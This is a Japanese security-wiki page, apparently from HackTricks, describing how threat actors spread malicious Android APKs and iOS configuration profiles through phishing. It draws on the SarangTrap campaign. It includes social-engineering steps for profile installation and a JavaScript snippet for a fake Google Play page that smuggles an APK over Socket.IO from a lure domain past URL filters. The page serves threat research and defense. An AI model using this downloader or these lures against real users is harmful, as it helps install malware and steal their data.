# モバイルフィッシングと悪意あるアプリの配布（Android & iOS）

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターがフィッシング（SEO、ソーシャルエンジニアリング、偽ストア、出会い系アプリなど）を通じて**悪意あるAndroid APK**や**iOSモバイル構成プロファイル**を配布する手法を解説します。
> 内容は、Zimperium zLabsが2025年に公開したSarangTrapキャンペーンや、その他の公開調査をもとにしています。<sup>[[1]](#references)</sup>

## 攻撃の流れ

1. **SEO/フィッシング用インフラ**
   * 類似ドメインを数十個登録する（出会い系、クラウド共有、カーサービスなど）。
     – `<title>`要素に現地語のキーワードや絵文字を使い、Googleでの検索順位を上げる。
     – 同じランディングページで、Android（`.apk`）とiOSのインストール手順を提供する。
2. **初期段階のダウンロード**
   * Android：*署名されていない* APK、または「サードパーティストア」のAPKへの直接リンク。
   * iOS：悪意ある**mobileconfig**プロファイルへの`itms-services://`または通常のHTTPSリンク（下記参照）。
3. **Androidのインストール後の挙動**
   * C2による実行制御、権限の悪用、dropper回避、バックグラウンドでの情報収集など、その他のインストール後のマルウェア挙動については、以下のAndroid Malware Post-Exploitation専用ページで解説します。
4. **iOSの配信手法**
   * 単一の**モバイル構成プロファイル**で、`PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration`などを要求し、デバイスを「MDM」のような監視下に登録できます。
   * ソーシャルエンジニアリングの手順：
     1. 設定を開く ➜ *プロファイルがダウンロード済み*を選択。
     2. *インストール*を3回タップする（フィッシングページにスクリーンショットを掲載）。
     3. 署名されていないプロファイルを信頼する ➜ 攻撃者はApp Storeの審査なしに*連絡先*と*写真*へのentitlementを得る。
5. **iOS Web Clipペイロード（フィッシングアプリのアイコン）**
   * `com.apple.webClip.managed`ペイロードを使うと、ブランド化されたアイコン/ラベル付きのフィッシングURLを**ホーム画面に固定**できます。
   * Web Clipは**フルスクリーン**で実行でき（ブラウザーUIを隠す）、**削除不可**に設定することもできます。その場合、アイコンを削除するには被害者がプロファイルを削除する必要があります。<sup>[[3]](#references)</sup>
6. **ネットワーク層**
   * 平文HTTP。多くの場合、`api.<phishingdomain>.com`のようなHOSTヘッダーを使い、ポート80で通信する。
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLSなし → 簡単に検出可能）。

## Android Malware Post-Exploitation

C2、Accessibilityの悪用、オーバーレイ、ATS自動化、段階的なDEX読み込み、プレミアムSMS、永続化など、Androidマルウェアのインストール後のtradecraftについては、以下を参照してください。

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocketベースのAPK Smugglingと偽Google Playページ

攻撃者は、静的なAPKリンクを、Google Playに見せかけた誘導ページに埋め込まれたSocket.IO/WebSocketチャネルに置き換えることが増えています。これによりペイロードURLが隠され、URL/拡張子フィルターを回避しながら、現実的なインストールUXを維持できます。<sup>[[2]](#references)[[4]](#references)</sup>

実際に確認された一般的なクライアントの流れ：

<details>
<summary>Socket.IOを使った偽Playダウンローダー（JavaScript）</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

単純な制御を回避できる理由:
- 静的なAPK URLは公開されず、ペイロードはWebSocketフレームからメモリ内で再構築されます。
- 直接の .apk レスポンスをブロックするURL/MIME/拡張子フィルターでは、WebSockets/Socket.IO経由でトンネルされるバイナリデータを見逃すことがあります。
- WebSocketsを実行しないクローラーやURLサンドボックスは、ペイロードを取得できません。

WebSocketの手法とツールについては、こちらも参照してください:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [ロマンスの暗黒面: SarangTrap恐喝キャンペーン](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Appleデバイス向けWeb Clipsペイロード設定](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [インドネシアおよびベトナムのAndroidユーザーを標的とするバンカートロイの木馬](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
